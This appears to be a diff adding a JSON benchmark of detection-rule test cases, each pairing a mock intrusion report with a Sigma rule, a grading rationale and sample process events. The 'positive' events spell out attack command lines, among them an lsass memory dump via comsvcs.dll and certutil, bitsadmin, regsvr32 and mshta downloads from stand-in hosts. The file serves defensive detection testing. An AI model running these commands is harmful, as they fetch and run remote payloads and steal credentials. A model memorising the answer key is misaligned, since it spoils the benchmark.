@@ -1,0 +1,1140 @@
+{
+ "cases": [
+  {
+   "assumptions": [],
+   "defect_class": "NONE",
+   "evasive": false,
+   "events": {
+    "lookalike": [
+     {
+      "cmd": "rundll32.exe shell32.dll,Control_RunDLL desk.cpl",
+      "image": "C:\\Windows\\System32\\rundll32.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\explorer.exe",
+      "parent_cmd": "explorer.exe",
+      "user": "LAB\\alice"
+     },
+     {
+      "cmd": "rundll32.exe printui.dll,PrintUIEntry /il",
+      "image": "C:\\Windows\\System32\\rundll32.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\explorer.exe",
+      "parent_cmd": "explorer.exe",
+      "user": "LAB\\bob"
+     }
+    ],
+    "negative": [
+     {
+      "cmd": "cmd.exe /c ipconfig /all",
+      "image": "C:\\Windows\\System32\\cmd.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\explorer.exe",
+      "parent_cmd": "explorer.exe",
+      "user": "LAB\\alice"
+     },
+     {
+      "cmd": "\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\" --profile-directory=Default",
+      "image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\explorer.exe",
+      "parent_cmd": "explorer.exe",
+      "user": "LAB\\alice"
+     },
+     {
+      "cmd": "schtasks /query /fo LIST",
+      "image": "C:\\Windows\\System32\\schtasks.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\cmd.exe",
+      "parent_cmd": "cmd.exe",
+      "user": "LAB\\alice"
+     }
+    ],
+    "positive": [
+     {
+      "cmd": "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();h=new%20ActiveXObject('WScript.Shell');h.Run('cmd.exe /c whoami')",
+      "image": "C:\\Windows\\System32\\rundll32.exe",
+      "kind": "process_create",
+      "parent": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+      "parent_cmd": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\" /n",
+      "user": "LAB\\alice"
+     },
+     {
+      "cmd": "rundll32 javascript:\"\\..\\mshtml,runhtmlapplication \";document.write();GetObject('script:http://files.cranemail.test/a.sct')",
+      "image": "C:\\Windows\\SysWOW64\\rundll32.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\explorer.exe",
+      "parent_cmd": "explorer.exe",
+      "user": "LAB\\bob"
+     },
+     {
+      "cmd": "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();window.close()",
+      "image": "C:\\Windows\\System32\\rundll32.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\explorer.exe",
+      "parent_cmd": "explorer.exe",
+      "user": "LAB\\alice"
+     }
+    ]
+   },
+   "evidence": [
+    "Telemetry shows rundll32.exe loading mshtml and calling the RunHTMLApplication export with an inline script",
+    "Legitimate use of rundll32.exe never passes a javascript: URI on the command line."
+   ],
+   "expected_gate": "none",
+   "id": "CTL1-01",
+   "logsource": "windows_process_creation",
+   "report_text": "During the intrusion at the logistics firm, the operator ran a first-stage script through a signed system binary. Telemetry shows rundll32.exe loading mshtml and calling the RunHTMLApplication export with an inline script, for example rundll32.exe javascript:\\..\\mshtml,RunHTMLApplication followed by a WScript.Shell Run call. Legitimate use of rundll32.exe never passes a javascript: URI on the command line. The same pattern appeared on three workstations within ten minutes, and every instance had Word or Explorer as the parent process. Detection should alert on rundll32.exe whose command line carries both javascript: and RunHTMLApplication, which keeps the rule specific to this loader.",
+   "role": "control",
+   "sigma_yaml": "title: Rundll32 Executing Inline JavaScript via RunHTMLApplication\nid: 5b0c7a1e-3d42-4f6b-8a91-2c7e4d9f1a01\nstatus: experimental\ndescription: 'Detects rundll32.exe calling the mshtml RunHTMLApplication export with an inline javascript: URI to run a script.'\nreferences:\n  - 'urn:atidep:case'\nauthor: case-author\ndate: 2026/10/02\ntags:\n  - attack.stealth\n  - attack.t1218.011\nlogsource:\n  category: process_creation\n  product: windows\ndetection:\n  selection_img:\n    Image|endswith: '\\rundll32.exe'\n  selection_cli:\n    CommandLine|contains|all:\n      - 'javascript:'\n      - 'RunHTMLApplication'\n  condition: selection_img and selection_cli\nfalsepositives:\n  - 'No legitimate software is known to pass a javascript: URI to rundll32.exe'\nlevel: high\n",
+   "tamper_sigma_yaml": "",
+   "techniques": [
+    "T1218.011"
+   ],
+   "why": "Correct rule: valid metadata, tags match T1218.011, every value (rundll32.exe, javascript:, RunHTMLApplication) is quoted in the evidence, it uses two selections that must both hold, and it matches only rundll32 command lines carrying both strings, so benign rundll32 control-panel and printer calls do not match."
+  },
+  {
+   "assumptions": [],
+   "defect_class": "NONE",
+   "evasive": false,
+   "events": {
+    "lookalike": [
+     {
+      "cmd": "rundll32.exe shell32.dll,Control_RunDLL inetcpl.cpl",
+      "image": "C:\\Windows\\System32\\rundll32.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\explorer.exe",
+      "parent_cmd": "explorer.exe",
+      "user": "LAB\\alice"
+     },
+     {
+      "cmd": "tasklist /fi \"imagename eq lsass.exe\"",
+      "image": "C:\\Windows\\System32\\tasklist.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\cmd.exe",
+      "parent_cmd": "cmd.exe",
+      "user": "LAB\\alice"
+     }
+    ],
+    "negative": [
+     {
+      "cmd": "tasklist /v",
+      "image": "C:\\Windows\\System32\\tasklist.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\cmd.exe",
+      "parent_cmd": "cmd.exe",
+      "user": "LAB\\alice"
+     },
+     {
+      "cmd": "whoami",
+      "image": "C:\\Windows\\System32\\whoami.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\cmd.exe",
+      "parent_cmd": "cmd.exe",
+      "user": "LAB\\alice"
+     },
+     {
+      "cmd": "wuauclt.exe /detectnow",
+      "image": "C:\\Windows\\System32\\wuauclt.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\svchost.exe",
+      "parent_cmd": "svchost.exe -k netsvcs",
+      "user": "NT AUTHORITY\\SYSTEM"
+     }
+    ],
+    "positive": [
+     {
+      "cmd": "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 624 C:\\Windows\\Temp\\lsa.dmp full",
+      "image": "C:\\Windows\\System32\\rundll32.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\cmd.exe",
+      "parent_cmd": "cmd.exe",
+      "user": "LAB\\alice"
+     },
+     {
+      "cmd": "rundll32.exe comsvcs.dll, #24 624 C:\\Users\\Public\\l.dmp full",
+      "image": "C:\\Windows\\System32\\rundll32.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "parent_cmd": "powershell.exe",
+      "user": "LAB\\alice"
+     },
+     {
+      "cmd": "rundll32 c:\\windows\\system32\\comsvcs.dll,minidump 624 c:\\windows\\temp\\a.dmp full",
+      "image": "C:\\Windows\\SysWOW64\\rundll32.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\wbem\\WmiPrvSE.exe",
+      "parent_cmd": "C:\\Windows\\System32\\wbem\\WmiPrvSE.exe -secured -Embedding",
+      "user": "NT AUTHORITY\\SYSTEM"
+     }
+    ]
+   },
+   "evidence": [
+    "The actor ran rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 624 C:\\Windows\\Temp\\lsa.dmp full",
+    "The same export can be reached by ordinal as comsvcs.dll #24, so the ordinal form must be covered as well."
+   ],
+   "expected_gate": "none",
+   "id": "CTL1-02",
+   "logsource": "windows_process_creation",
+   "report_text": "The credential theft stage was carried out without dropping a dumping tool. The actor ran rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 624 C:\\Windows\\Temp\\lsa.dmp full, where 624 was the process identifier of lsass.exe resolved earlier with tasklist. The MiniDump export of comsvcs.dll is an undocumented way to write a process memory dump and no administration tooling in this environment uses it. The same export can be reached by ordinal as comsvcs.dll #24, so the ordinal form must be covered as well. The dump was compressed and uploaded within minutes. Defenders should detect rundll32.exe invoking comsvcs.dll together with the MiniDump export or its ordinal.",
+   "role": "control",
+   "sigma_yaml": "title: Rundll32 Comsvcs MiniDump Process Memory Dump\nid: 7c1d8b2f-4e53-4a7c-9b02-3d8f5e0a2b02\nstatus: experimental\ndescription: 'Detects rundll32.exe invoking the MiniDump export of comsvcs.dll, by name or by ordinal, to write a process memory dump.'\nreferences:\n  - 'urn:atidep:case'\nauthor: case-author\ndate: 2026/10/02\ntags:\n  - attack.credential_access\n  - attack.t1003.001\n  - attack.stealth\n  - attack.t1218.011\nlogsource:\n  category: process_creation\n  product: windows\ndetection:\n  selection_img:\n    Image|endswith: '\\rundll32.exe'\n  selection_dll:\n    CommandLine|contains: 'comsvcs.dll'\n  selection_export:\n    CommandLine|contains:\n      - 'MiniDump'\n      - '#24'\n  condition: selection_img and selection_dll and selection_export\nfalsepositives:\n  - 'Rare debugging by administrators using the comsvcs.dll MiniDump export'\nlevel: high\n",
+   "tamper_sigma_yaml": "",
+   "techniques": [
+    "T1003.001",
+    "T1218.011"
+   ],
+   "why": "Correct rule: tags match T1003.001 and T1218.011, all values (rundll32.exe, comsvcs.dll, MiniDump, #24) are quoted in the evidence, it covers both the named export and the ordinal form, and it ignores rundll32 calls to other DLLs and ordinary lsass lookups."
+  },
+  {
+   "assumptions": [],
+   "defect_class": "NONE",
+   "evasive": false,
+   "events": {
+    "lookalike": [
+     {
+      "cmd": "regsvr32.exe /s \"C:\\Program Files\\Common Files\\Vendor\\viewer.dll\"",
+      "image": "C:\\Windows\\System32\\regsvr32.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\msiexec.exe",
+      "parent_cmd": "msiexec.exe /i C:\\Temp\\app.msi /qn",
+      "user": "NT AUTHORITY\\SYSTEM"
+     },
+     {
+      "cmd": "regsvr32.exe /s /u C:\\Program Files\\OldApp\\shell.dll",
+      "image": "C:\\Windows\\System32\\regsvr32.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\cmd.exe",
+      "parent_cmd": "cmd.exe",
+      "user": "LAB\\bob"
+     }
+    ],
+    "negative": [
+     {
+      "cmd": "msiexec.exe /i C:\\Temp\\app.msi /qn",
+      "image": "C:\\Windows\\System32\\msiexec.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\services.exe",
+      "parent_cmd": "services.exe",
+      "user": "NT AUTHORITY\\SYSTEM"
+     },
+     {
+      "cmd": "cmd.exe /c ipconfig /all",
+      "image": "C:\\Windows\\System32\\cmd.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\explorer.exe",
+      "parent_cmd": "explorer.exe",
+      "user": "LAB\\alice"
+     },
+     {
+      "cmd": "OUTLOOK.EXE",
+      "image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\explorer.exe",
+      "parent_cmd": "explorer.exe",
+      "user": "LAB\\alice"
+     }
+    ],
+    "positive": [
+     {
+      "cmd": "regsvr32.exe /s /n /u /i:http://files.cranemail.test/update.sct scrobj.dll",
+      "image": "C:\\Windows\\System32\\regsvr32.exe",
+      "kind": "process_create",
+      "parent": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+      "parent_cmd": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\" /n",
+      "user": "LAB\\alice"
+     },
+     {
+      "cmd": "regsvr32 /u /n /s /i:https://cdn.example/x.sct scrobj.dll",
+      "image": "C:\\Windows\\SysWOW64\\regsvr32.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\cmd.exe",
+      "parent_cmd": "cmd.exe",
+      "user": "LAB\\bob"
+     },
+     {
+      "cmd": "C:\\Windows\\System32\\regsvr32.exe /s /n /u /i:http://198.51.100.23/a.sct scrobj.dll",
+      "image": "C:\\Windows\\System32\\regsvr32.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "parent_cmd": "powershell.exe",
+      "user": "LAB\\alice"
+     }
+    ]
+   },
+   "evidence": [
+    "regsvr32.exe /s /n /u /i:http://files.cranemail.test/update.sct scrobj.dll",
+    "Analysts should alert when regsvr32.exe is started with scrobj.dll and a remote /i:http argument."
+   ],
+   "expected_gate": "none",
+   "id": "CTL1-03",
+   "logsource": "windows_process_creation",
+   "report_text": "The phishing document launched a scriptlet loader without writing an executable to disk. The activity began minutes after the user opened the attachment. Process telemetry recorded regsvr32.exe /s /n /u /i:http://files.cranemail.test/update.sct scrobj.dll, a technique often called Squiblydoo, which makes the signed regsvr32.exe fetch and run a remote scriptlet. The scrobj.dll library is the scriptlet runtime and there is no reason for it to appear in a regsvr32 command line in this estate. The /i: switch carried an http URL in every observed case. Analysts should alert when regsvr32.exe is started with scrobj.dll and a remote /i:http argument.",
+   "role": "control",
+   "sigma_yaml": "title: Regsvr32 Remote Scriptlet Execution via Scrobj\nid: 8d2e9c30-5f64-4b8d-a113-4e906f1b3c03\nstatus: experimental\ndescription: 'Detects regsvr32.exe loading scrobj.dll with a remote scriptlet URL passed through the /i: switch.'\nreferences:\n  - 'urn:atidep:case'\nauthor: case-author\ndate: 2026/10/02\ntags:\n  - attack.stealth\n  - attack.t1218.010\nlogsource:\n  category: process_creation\n  product: windows\ndetection:\n  selection_img:\n    Image|endswith: '\\regsvr32.exe'\n  selection_scrobj:\n    CommandLine|contains: 'scrobj.dll'\n  selection_remote:\n    CommandLine|contains: '/i:http'\n  condition: all of selection*\nfalsepositives:\n  - 'Legacy software that registers remote scriptlets, which is not expected in this estate'\nlevel: high\n",
+   "tamper_sigma_yaml": "",
+   "techniques": [
+    "T1218.010"
+   ],
+   "why": "Correct rule: tags match T1218.010, every value (regsvr32.exe, scrobj.dll, /i:http) is quoted in the evidence, all three selections must hold, and ordinary regsvr32 DLL registration without scrobj.dll and a remote /i: URL does not match."
+  },
+  {
+   "assumptions": [],
+   "defect_class": "NONE",
+   "evasive": false,
+   "events": {
+    "lookalike": [
+     {
+      "cmd": "mshta.exe \"C:\\Program Files\\HRPortal\\hrportal.hta\" http://hr.lab.invalid/sso",
+      "image": "C:\\Windows\\System32\\mshta.exe",
+      "kind": "process_create",
+      "parent": "C:\\Program Files\\HRPortal\\hrportal.exe",
+      "parent_cmd": "\"C:\\Program Files\\HRPortal\\hrportal.exe\"",
+      "user": "LAB\\alice"
+     },
+     {
+      "cmd": "mshta.exe \"C:\\Program Files\\HRPortal\\help.hta\"",
+      "image": "C:\\Windows\\System32\\mshta.exe",
+      "kind": "process_create",
+      "parent": "C:\\Program Files\\HRPortal\\hrportal.exe",
+      "parent_cmd": "\"C:\\Program Files\\HRPortal\\hrportal.exe\"",
+      "user": "LAB\\bob"
+     }
+    ],
+    "negative": [
+     {
+      "cmd": "notepad.exe C:\\Users\\alice\\todo.txt",
+      "image": "C:\\Windows\\System32\\notepad.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\explorer.exe",
+      "parent_cmd": "explorer.exe",
+      "user": "LAB\\alice"
+     },
+     {
+      "cmd": "whoami",
+      "image": "C:\\Windows\\System32\\whoami.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\cmd.exe",
+      "parent_cmd": "cmd.exe",
+      "user": "LAB\\alice"
+     },
+     {
+      "cmd": "powershell.exe -Command \"Get-Service | Where-Object Status -eq Running\"",
+      "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\explorer.exe",
+      "parent_cmd": "explorer.exe",
+      "user": "LAB\\alice"
+     }
+    ],
+    "positive": [
+     {
+      "cmd": "mshta.exe http://docs.cranemail.test/invoice.hta",
+      "image": "C:\\Windows\\System32\\mshta.exe",
+      "kind": "process_create",
+      "parent": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+      "parent_cmd": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\" /n",
+      "user": "LAB\\alice"
+     },
+     {
+      "cmd": "mshta.exe vbscript:Execute(window.close)",
+      "image": "C:\\Windows\\System32\\mshta.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\cmd.exe",
+      "parent_cmd": "cmd.exe",
+      "user": "LAB\\bob"
+     },
+     {
+      "cmd": "mshta.exe javascript:a=GetObject('script:http://203.0.113.9/x.sct').Exec();close()",
+      "image": "C:\\Windows\\SysWOW64\\mshta.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\explorer.exe",
+      "parent_cmd": "explorer.exe",
+      "user": "LAB\\alice"
+     }
+    ]
+   },
+   "evidence": [
+    "Observed command lines included mshta.exe http://docs.cranemail.test/invoice.hta and mshta.exe vbscript:Execute(window.close).",
+    "One internal tool, the HR portal launcher hrportal.exe, also starts mshta.exe but always with its local file hrportal.hta",
+    "Detection should cover mshta.exe invoked with an http, vbscript: or javascript: argument."
+   ],
+   "expected_gate": "none",
+   "id": "CTL1-04",
+   "logsource": "windows_process_creation",
+   "report_text": "Several endpoints started mshta.exe with a URL or inline script instead of a local application file. Observed command lines included mshta.exe http://docs.cranemail.test/invoice.hta and mshta.exe vbscript:Execute(window.close). Remote HTA content and inline vbscript: or javascript: URIs were the loaders used throughout this campaign. One internal tool, the HR portal launcher hrportal.exe, also starts mshta.exe but always with its local file hrportal.hta, so that launcher is a known false positive and should be excluded. Detection should cover mshta.exe invoked with an http, vbscript: or javascript: argument.",
+   "role": "control",
+   "sigma_yaml": "title: Mshta Executing Remote or Inline Script Content\nid: 9e3fad41-6075-4c9e-b224-5fa170c24d04\nstatus: experimental\ndescription: 'Detects mshta.exe started with an http URL or an inline vbscript: or javascript: argument, excluding the known HR portal launcher.'\nreferences:\n  - 'urn:atidep:case'\nauthor: case-author\ndate: 2026/10/02\ntags:\n  - attack.stealth\n  - attack.t1218.005\nlogsource:\n  category: process_creation\n  product: windows\ndetection:\n  selection_img:\n    Image|endswith: '\\mshta.exe'\n  selection_cli:\n    CommandLine|contains:\n      - 'http'\n      - 'vbscript:'\n      - 'javascript:'\n  filter_hr:\n    ParentImage|endswith: '\\hrportal.exe'\n    CommandLine|contains: 'hrportal.hta'\n  condition: selection_img and selection_cli and not filter_hr\nfalsepositives:\n  - 'The HR portal launcher is excluded; other internal HTA applications opened from a URL'\nlevel: high\n",
+   "tamper_sigma_yaml": "",
+   "techniques": [
+    "T1218.005"
+   ],
+   "why": "Correct rule: tags match T1218.005, every positive and filter value is quoted in the evidence, the positive part needs an http, vbscript: or javascript: argument, and the 'not' filter removes only the documented HR portal launcher (parent hrportal.exe plus hrportal.hta), so the look-alike launcher event does not match."
+  },
+  {
+   "assumptions": [],
+   "defect_class": "NONE",
+   "evasive": false,
+   "events": {
+    "lookalike": [
+     {
+      "cmd": "certutil.exe -hashfile C:\\Temp\\app.msi SHA256",
+      "image": "C:\\Windows\\System32\\certutil.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\cmd.exe",
+      "parent_cmd": "cmd.exe",
+      "user": "LAB\\alice"
+     },
+     {
+      "cmd": "certutil.exe -urlcache * delete",
+      "image": "C:\\Windows\\System32\\certutil.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\cmd.exe",
+      "parent_cmd": "cmd.exe",
+      "user": "LAB\\alice"
+     }
+    ],
+    "negative": [
+     {
+      "cmd": "cmd.exe /c whoami",
+      "image": "C:\\Windows\\System32\\cmd.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\explorer.exe",
+      "parent_cmd": "explorer.exe",
+      "user": "LAB\\alice"
+     },
+     {
+      "cmd": "tasklist /v",
+      "image": "C:\\Windows\\System32\\tasklist.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\cmd.exe",
+      "parent_cmd": "cmd.exe",
+      "user": "LAB\\alice"
+     },
+     {
+      "cmd": "ipconfig /all",
+      "image": "C:\\Windows\\System32\\ipconfig.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\cmd.exe",
+      "parent_cmd": "cmd.exe",
+      "user": "LAB\\bob"
+     }
+    ],
+    "positive": [
+     {
+      "cmd": "certutil.exe -urlcache -split -f http://203.0.113.45/svc.bin C:\\Users\\Public\\svc.exe",
+      "image": "C:\\Windows\\System32\\certutil.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\cmd.exe",
+      "parent_cmd": "cmd.exe /c",
+      "user": "LAB\\alice"
+     },
+     {
+      "cmd": "certutil.exe /urlcache /split /f http://files.cranemail.test/u.dll C:\\Windows\\Temp\\u.dll",
+      "image": "C:\\Windows\\System32\\certutil.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\wscript.exe",
+      "parent_cmd": "wscript.exe //B C:\\Users\\alice\\AppData\\Local\\Temp\\inv.js",
+      "user": "LAB\\alice"
+     },
+     {
+      "cmd": "certutil -split -urlcache -f http://198.51.100.7/a.exe C:\\Users\\Public\\a.exe",
+      "image": "C:\\Windows\\SysWOW64\\certutil.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "parent_cmd": "powershell.exe",
+      "user": "LAB\\bob"
+     }
+    ]
+   },
+   "evidence": [
+    "certutil.exe -urlcache -split -f http://203.0.113.45/svc.bin C:\\Users\\Public\\svc.exe",
+    "Rules should match certutil.exe with both the urlcache and split switches in either dash style."
+   ],
+   "expected_gate": "none",
+   "id": "CTL1-05",
+   "logsource": "windows_process_creation",
+   "report_text": "The loader retrieved its second stage with certutil.exe instead of a browser. Process creation events show certutil.exe -urlcache -split -f http://203.0.113.45/svc.bin C:\\Users\\Public\\svc.exe, run from a command shell spawned by a malicious macro. The urlcache and split switches are only used together when certutil is abused as a downloader. Variants of the same command used the slash form certutil.exe /urlcache /split /f, which certutil accepts equally. The downloaded file was renamed and executed within seconds. Rules should match certutil.exe with both the urlcache and split switches in either dash style.",
+   "role": "control",
+   "sigma_yaml": "title: Certutil Used as Downloader via Urlcache and Split\nid: af40be52-7186-4daf-8335-60b281d35e05\nstatus: experimental\ndescription: 'Detects certutil.exe run with both the urlcache and split switches, in dash or slash spelling, which downloads a remote file.'\nreferences:\n  - 'urn:atidep:case'\nauthor: case-author\ndate: 2026/10/02\ntags:\n  - attack.command_and_control\n  - attack.t1105\nlogsource:\n  category: process_creation\n  product: windows\ndetection:\n  selection_img:\n    Image|endswith: '\\certutil.exe'\n  selection_cli:\n    CommandLine|windash|contains|all:\n      - '-urlcache'\n      - '-split'\n  condition: selection_img and selection_cli\nfalsepositives:\n  - 'Administrators downloading certificate revocation data by hand'\nlevel: high\n",
+   "tamper_sigma_yaml": "",
+   "techniques": [
+    "T1105"
+   ],
+   "why": "Correct rule: tag T1105 is valid, -urlcache and -split are quoted in the evidence, the windash modifier covers the slash spelling that certutil accepts, and the 'all' modifier requires both switches, so hash checks and cache deletion with certutil do not match."
+  },
+  {
+   "assumptions": [],
+   "defect_class": "NONE",
+   "evasive": false,
+   "events": {
+    "lookalike": [
+     {
+      "cmd": "bitsadmin.exe /list /allusers",
+      "image": "C:\\Windows\\System32\\bitsadmin.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\cmd.exe",
+      "parent_cmd": "cmd.exe",
+      "user": "LAB\\alice"
+     },
+     {
+      "cmd": "powershell.exe -Command Get-BitsTransfer",
+      "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\cmd.exe",
+      "parent_cmd": "cmd.exe",
+      "user": "LAB\\alice"
+     }
+    ],
+    "negative": [
+     {
+      "cmd": "\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\" --profile-directory=Default",
+      "image": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\explorer.exe",
+      "parent_cmd": "explorer.exe",
+      "user": "LAB\\alice"
+     },
+     {
+      "cmd": "schtasks /query /fo LIST",
+      "image": "C:\\Windows\\System32\\schtasks.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\cmd.exe",
+      "parent_cmd": "cmd.exe",
+      "user": "LAB\\alice"
+     },
+     {
+      "cmd": "powershell.exe -Command \"Get-Service | Where-Object Status -eq Running\"",
+      "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\explorer.exe",
+      "parent_cmd": "explorer.exe",
+      "user": "LAB\\alice"
+     }
+    ],
+    "positive": [
+     {
+      "cmd": "bitsadmin.exe /transfer updatejob /download /priority high http://203.0.113.60/p.exe C:\\Users\\Public\\p.exe",
+      "image": "C:\\Windows\\System32\\bitsadmin.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\cmd.exe",
+      "parent_cmd": "cmd.exe /c",
+      "user": "LAB\\alice"
+     },
+     {
+      "cmd": "bitsadmin /transfer j1 /download http://files.cranemail.test/a.dll C:\\Windows\\Temp\\a.dll",
+      "image": "C:\\Windows\\System32\\bitsadmin.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\wscript.exe",
+      "parent_cmd": "wscript.exe //B C:\\Users\\alice\\AppData\\Local\\Temp\\inv.js",
+      "user": "LAB\\alice"
+     },
+     {
+      "cmd": "powershell.exe -nop -w hidden -c Start-BitsTransfer -Source http://203.0.113.60/p.exe -Destination C:\\Users\\Public\\p.exe",
+      "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\cmd.exe",
+      "parent_cmd": "cmd.exe /c",
+      "user": "LAB\\bob"
+     }
+    ]
+   },
+   "evidence": [
+    "bitsadmin.exe /transfer updatejob /download /priority high http://203.0.113.60/p.exe C:\\Users\\Public\\p.exe",
+    "the operator switched to powershell.exe and called Start-BitsTransfer with a Source argument pointing at the same server"
+   ],
+   "expected_gate": "none",
+   "id": "CTL1-06",
+   "logsource": "windows_process_creation",
+   "report_text": "BITS was used as a quiet downloader on infected hosts. A scheduled script ran bitsadmin.exe /transfer updatejob /download /priority high http://203.0.113.60/p.exe C:\\Users\\Public\\p.exe, and in a second wave the operator switched to powershell.exe and called Start-BitsTransfer with a Source argument pointing at the same server. Both forms create a BITS job that survives a reboot until the transfer completes. The bitsadmin.exe /transfer switch together with /download is the telltale combination on the command line, and the cmdlet name Start-BitsTransfer is the equivalent marker for the PowerShell form.",
+   "role": "control",
+   "sigma_yaml": "title: BITS Job Download via Bitsadmin or Start-BitsTransfer\nid: b051cf63-8297-4eb0-9446-71c392e46f06\nstatus: experimental\ndescription: 'Detects bitsadmin.exe creating a download transfer, or powershell.exe calling Start-BitsTransfer, to fetch a remote file.'\nreferences:\n  - 'urn:atidep:case'\nauthor: case-author\ndate: 2026/10/02\ntags:\n  - attack.execution\n  - attack.persistence\n  - attack.stealth\n  - attack.command_and_control\n  - attack.t1197\n  - attack.t1105\nlogsource:\n  category: process_creation\n  product: windows\ndetection:\n  selection_bitsadmin:\n    Image|endswith: '\\bitsadmin.exe'\n    CommandLine|contains|all:\n      - '/transfer'\n      - '/download'\n  selection_powershell:\n    Image|endswith: '\\powershell.exe'\n    CommandLine|contains: 'Start-BitsTransfer'\n  condition: 1 of selection*\nfalsepositives:\n  - 'Software deployment scripts that use BITS to fetch installers'\nlevel: medium\n",
+   "tamper_sigma_yaml": "",
+   "techniques": [
+    "T1197",
+    "T1105"
+   ],
+   "why": "Correct rule: tags match T1197 and T1105, all values (bitsadmin.exe, /transfer, /download, powershell.exe, Start-BitsTransfer) are quoted in the evidence, each of the two alternatives has its own discriminating command-line term, and BITS job listing or the Get-BitsTransfer cmdlet do not match."
+  },
+  {
+   "assumptions": [],
+   "defect_class": "NONE",
+   "evasive": false,
+   "events": {
+    "lookalike": [
+     {
+      "cmd": "wmic.exe process list brief",
+      "image": "C:\\Windows\\System32\\wbem\\WMIC.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\cmd.exe",
+      "parent_cmd": "cmd.exe",
+      "user": "LAB\\alice"
+     },
+     {
+      "cmd": "wmic.exe /node:WS-FIN-07 process call create C:\\Program Files\\RemoteSupport\\client.exe",
+      "image": "C:\\Windows\\System32\\wbem\\WMIC.exe",
+      "kind": "process_create",
+      "parent": "C:\\Program Files\\HelpdeskTools\\hdtools.exe",
+      "parent_cmd": "\"C:\\Program Files\\HelpdeskTools\\hdtools.exe\"",
+      "user": "LAB\\helpdesk"
+     }
+    ],
+    "negative": [
+     {
+      "cmd": "net use",
+      "image": "C:\\Windows\\System32\\net.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\cmd.exe",
+      "parent_cmd": "cmd.exe",
+      "user": "LAB\\alice"
+     },
+     {
+      "cmd": "OUTLOOK.EXE",
+      "image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\explorer.exe",
+      "parent_cmd": "explorer.exe",
+      "user": "LAB\\alice"
+     },
+     {
+      "cmd": "msiexec.exe /i C:\\Temp\\app.msi /qn",
+      "image": "C:\\Windows\\System32\\msiexec.exe",
+      "kind": "process_create",
+      "parent": "C:\\Windows\\System32\\services.exe",
+      "parent_cmd": "services.exe",
+      "user": "NT AUTHORITY\\SYSTEM"
+     }
+    ],
+    "positive": [
+     {
